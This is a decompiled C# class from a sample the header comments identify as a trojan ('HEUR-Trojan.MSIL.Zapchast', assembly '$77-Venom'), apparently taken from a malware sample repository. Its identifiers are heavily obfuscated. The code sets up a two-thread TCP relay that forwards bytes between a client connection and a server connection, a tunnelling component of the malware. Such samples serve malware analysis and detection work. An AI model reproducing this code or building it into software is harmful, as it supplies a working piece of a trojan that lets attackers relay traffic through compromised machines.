// Decompiled with JetBrains decompiler
// Type: 楼斾鱑义쥡─咼ⷝ㐶輕밅㲤윃자ꩼ�⼾ภ
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Net.Sockets;
using System.Threading;

internal class 楼斾鱑义쥡\u2500咼\uE251ⷝ㐶輕밅㲤윃자ꩼ\uE2C4\uFFFD\u2F3Eภ
{
  private TcpClient 郦谆\uF370陶좂惨\u2AE7뜘\u25DDꎎ\u1735\u1C81\uF4A8뻿쟅윆䡄镇뭠\uF352;
  private TcpClient \u32A3峪暅\u0A79催ꃣ㳗몶ⶇඖ\u2F24璈槊\uF77Aߧ뗇ﲞ鷙\u2658㭬;
  private NetworkStream \u1067㭍鍟ੳ\u2B8F\uE484괍\uE406썳욒擞\uE637\u2B74\uE1BA硖讙閫ψ뭛跛;
  private NetworkStream 嬒\u2118ᠴ䘍\u2986忓苄샾냽瑱\u2F27נ䇒\uE573鲋䍩㨃詝䨝䌜;
  private \uEEA2抜鶘需謺ꍴ\uFFFD㛴ꆲ푐\uFFFDᯏᚇ䕫\uE44B᳥꤭虰\uE997ᆳ.ꖓ\u09A9ꈿ雎썤\u325Dෑ\uED8B椀庯\uFFFD\u1AEF\uF7A0\u2D9F꿧暈\uEB65\u2990\uEF38\u2A29 绥膩犦敯\u2499月志卒鏮\u0DF5瑼焾ဃ鬬婊Ⴡ\u21E4䧵澲賆;

  public void 饎眳發ᒱ䣭㾧ꢛ䋌澱덞\uF149㩫꺟것Ꮯᓧೢᑧ㧁푊(
    TcpClient client,
    NetworkStream client_str,
    TcpClient server,
    \uEEA2抜鶘需謺ꍴ\uFFFD㛴ꆲ푐\uFFFDᯏᚇ䕫\uE44B᳥꤭虰\uE997ᆳ.ꖓ\u09A9ꈿ雎썤\u325Dෑ\uED8B椀庯\uFFFD\u1AEF\uF7A0\u2D9F꿧暈\uEB65\u2990\uEF38\u2A29 notify)
  {
    this.郦谆\uF370陶좂惨\u2AE7뜘\u25DDꎎ\u1735\u1C81\uF4A8뻿쟅윆䡄镇뭠\uF352 = client;
    this.\u32A3峪暅\u0A79催ꃣ㳗몶ⶇඖ\u2F24璈槊\uF77Aߧ뗇ﲞ鷙\u2658㭬 = server;
    this.\u1067㭍鍟ੳ\u2B8F\uE484괍\uE406썳욒擞\uE637\u2B74\uE1BA硖讙閫ψ뭛跛 = client_str;
    this.嬒\u2118ᠴ䘍\u2986忓苄샾냽瑱\u2F27נ䇒\uE573鲋䍩㨃詝䨝䌜 = server.GetStream();
    this.绥膩犦敯\u2499月志卒鏮\u0DF5瑼焾ဃ鬬婊Ⴡ\u21E4䧵澲賆 = notify;
    new Thread(new ThreadStart(this.升춾昂\uF596\uFFFD\u237B\u2374㲝\uEFB7\uE78A鏴റ谄ꍗ\uE6B8ⴓ頠\uEF38낉\u0886)).Start();
    new Thread(new ThreadStart(this.㦝艀\uED8E糇\u2AD9\u264E儸ෆ錵ꅝ\uEC5A刮늗㖌솄퉻\uFFFD䊭ᓳ햲)).Start();
  }

  private void 升춾昂\uF596\uFFFD\u237B\u2374㲝\uEFB7\uE78A鏴റ谄ꍗ\uE6B8ⴓ頠\uEF38낉\u0886()
  {
    try
    {
      byte[] buffer = new byte[24577];
      while (\uEEA2抜鶘需謺ꍴ\uFFFD㛴ꆲ푐\uFFFDᯏᚇ䕫\uE44B᳥꤭虰\uE997ᆳ.\uA626㾟窾䩣͔폜\uFFFDᓟ冶뼐関偪霅쬻䜫ᢉ兺ᦸ\uF342墟)
      {
        int count = this.\u1067㭍鍟ੳ\u2B8F\uE484괍\uE406썳욒擞\uE637\u2B74\uE1BA硖讙閫ψ뭛跛.Read(buffer, 0, buffer.Length);
        if (count == 0)
        {
          this.\u1067㭍鍟ੳ\u2B8F\uE484괍\uE406썳욒擞\uE637\u2B74\uE1BA硖讙閫ψ뭛跛.Close();
          this.郦谆\uF370陶좂惨\u2AE7뜘\u25DDꎎ\u1735\u1C81\uF4A8뻿쟅윆䡄镇뭠\uF352.Close();
          this.\u32A3峪暅\u0A79催ꃣ㳗몶ⶇඖ\u2F24璈槊\uF77Aߧ뗇ﲞ鷙\u2658㭬.Close();
          this.嬒\u2118ᠴ䘍\u2986忓苄샾냽瑱\u2F27נ䇒\uE573鲋䍩㨃詝䨝䌜.Close();
          break;
        }
        this.嬒\u2118ᠴ䘍\u2986忓苄샾냽瑱\u2F27נ䇒\uE573鲋䍩㨃詝䨝䌜.Write(buffer, 0, count);
        this.嬒\u2118ᠴ䘍\u2986忓苄샾냽瑱\u2F27נ䇒\uE573鲋䍩㨃詝䨝䌜.Flush();
      }
    }
    catch (Exception ex)
    {
      this.郦谆\uF370陶좂惨\u2AE7뜘\u25DDꎎ\u1735\u1C81\uF4A8뻿쟅윆䡄镇뭠\uF352.Close();
      this.\u32A3峪暅\u0A79催ꃣ㳗몶ⶇඖ\u2F24璈槊\uF77Aߧ뗇ﲞ鷙\u2658㭬.Close();
    }
  }

  private void 㦝艀\uED8E糇\u2AD9\u264E儸ෆ錵ꅝ\uEC5A刮늗㖌솄퉻\uFFFD䊭ᓳ햲()
  {
    try
    {
      byte[] buffer = new byte[24577];
      while (\uEEA2抜鶘需謺ꍴ\uFFFD㛴ꆲ푐\uFFFDᯏᚇ䕫\uE44B᳥꤭虰\uE997ᆳ.\uA626㾟窾䩣͔폜\uFFFDᓟ冶뼐関偪霅쬻䜫ᢉ兺ᦸ\uF342墟)
      {
        int count = this.嬒\u2118ᠴ䘍\u2986忓苄샾냽瑱\u2F27נ䇒\uE573鲋䍩㨃詝䨝䌜.Read(buffer, 0, buffer.Length);
        if (count == 0)
        {
          this.\u1067㭍鍟ੳ\u2B8F\uE484괍\uE406썳욒擞\uE637\u2B74\uE1BA硖讙閫ψ뭛跛.Close();
          this.郦谆\uF370陶좂惨\u2AE7뜘\u25DDꎎ\u1735\u1C81\uF4A8뻿쟅윆䡄镇뭠\uF352.Close();
          this.\u32A3峪暅\u0A79催ꃣ㳗몶ⶇඖ\u2F24璈槊\uF77Aߧ뗇ﲞ鷙\u2658㭬.Close();
          this.嬒\u2118ᠴ䘍\u2986忓苄샾냽瑱\u2F27נ䇒\uE573鲋䍩㨃詝䨝䌜.Close();
          break;
        }
        this.\u1067㭍鍟ੳ\u2B8F\uE484괍\uE406썳욒擞\uE637\u2B74\uE1BA硖讙閫ψ뭛跛.Write(buffer, 0, count);
        this.\u1067㭍鍟ੳ\u2B8F\uE484괍\uE406썳욒擞\uE637\u2B74\uE1BA硖讙閫ψ뭛跛.Flush();
      }
    }
    catch (Exception ex)
    {
      this.郦谆\uF370陶좂惨\u2AE7뜘\u25DDꎎ\u1735\u1C81\uF4A8뻿쟅윆䡄镇뭠\uF352.Close();
      this.\u32A3峪暅\u0A79催ꃣ㳗몶ⶇඖ\u2F24璈槊\uF77Aߧ뗇ﲞ鷙\u2658㭬.Close();
    }
  }
}
